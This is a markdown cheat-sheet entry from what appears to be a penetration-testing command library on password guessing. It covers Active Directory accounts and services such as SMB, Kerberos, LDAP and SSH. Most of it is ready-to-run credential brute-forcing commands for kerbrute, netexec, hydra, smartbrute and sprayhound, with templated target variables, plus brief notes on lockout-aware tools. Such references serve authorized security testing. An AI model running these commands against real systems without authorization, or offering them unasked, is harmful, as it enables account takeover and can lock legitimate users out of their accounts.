---
technique: PasswordGuessing
category: bruteforcing
protocols: SMB, LDAP, Kerberos, WinRM, SSH, FTP, RDP, MSSQL, HTTP
remote_capable: true
tags: guessing bruteforce credential-attack password common default ad
---

# PasswordGuessing

Password guessing tests multiple passwords against one or more accounts using common passwords, vendor defaults, or context-derived candidates. The main risk is account lockout: always verify the domain lockout policy before running any guessing campaign in a production environment.

## Guessing Strategies

| Strategy | Description |
|----------|-------------|
| Common passwords | Generic top-N lists (SecLists, rockyou subsets) against one or many accounts |
| Default passwords | Vendor-specific defaults against service accounts or systems with known technology stacks |
| Situational | Company name, city, username, or variations targeting a specific user or role |

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Target service | Confirm the protocol is reachable before attempting |
| Lockout policy | Check `Default Domain Policy` or fine-grained PSOs before guessing |

## Windows

### kerbrute (Windows)

#go #kerberos #guessing

Bruteforce a specific account's password over Kerberos pre-authentication from a Windows host.

```powershell title:"Password guess a single account via kerbrute on Windows"
.\kerbrute.exe bruteuser -d "$domain" --dc "$rhost_ip" passwords.txt "$target_user"
```
<!-- cheat
import domain_ip
var target_user
-->

## Linux

### netexec (single user)

#smb #guessing

Guess passwords against a single account over SMB.

```sh title:"Credential guessing against single user via netexec"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -p passwords.txt --continue-on-success
```
<!-- cheat
import domain_ip
import users
-->

### netexec (user-password pairs)

#smb #ldap #guessing #multi-protocol

Guess credentials pairing each user with its corresponding password line using `--no-bruteforce` over SMB.

```sh title:"Credential guessing with user-password pairs via netexec"
nxc smb "$rhost_ip" -d "$domain" -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```
<!-- cheat
import domain_ip
import users
-->

### hydra (single user)

#c #multi-protocol #guessing

Guess credentials for a single user over SMB across 50+ supported protocols.

```sh title:"Credential guessing single user via Hydra over SMB"
hydra -l "$user" -P passwords.txt "$rhost_ip" smb
```
<!-- cheat
import users
var rhost_ip
-->

### hydra (user list)

#c #multi-protocol #guessing

Guess credentials for a list of users over SSH using Hydra.

```sh title:"Credential guessing user list via Hydra over SSH"
hydra -L users.txt -P passwords.txt "$rhost_ip" ssh
```
<!-- cheat
var rhost_ip
-->

### kerbrute

#go #kerberos #guessing

Guess passwords for a specific user over Kerberos pre-authentication; less noisy than LDAP or SMB auth events.

```sh title:"Password guessing via kerbrute over Kerberos"
kerbrute bruteuser -d "$domain" --dc "$rhost_ip" passwords.txt "$target_user"
```
<!-- cheat
import domain_ip
var target_user
-->

### smartbrute

#python #kerberos #guessing #lockout-safe

Guess passwords while dynamically tracking the domain lockout policy to avoid locking out accounts.

```sh title:"Policy-aware password guessing via smartbrute"
smartbrute brute -bU users.txt -bP passwords.txt kerberos --kdc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
-->

### sprayhound

#python #ldap #guessing #lockout-safe #bloodhound

Guess passwords while tracking per-account lockout counters and optionally marking owned accounts in BloodHound; also detects accounts with username-as-password.

```sh title:"Policy-aware password guessing via sprayhound"
sprayhound -u "$user" -p "$pass" -d "$domain" -dc "$rhost_ip" --passwordfile passwords.txt
```
<!-- cheat
import domain_ip
import users
import passwords
-->
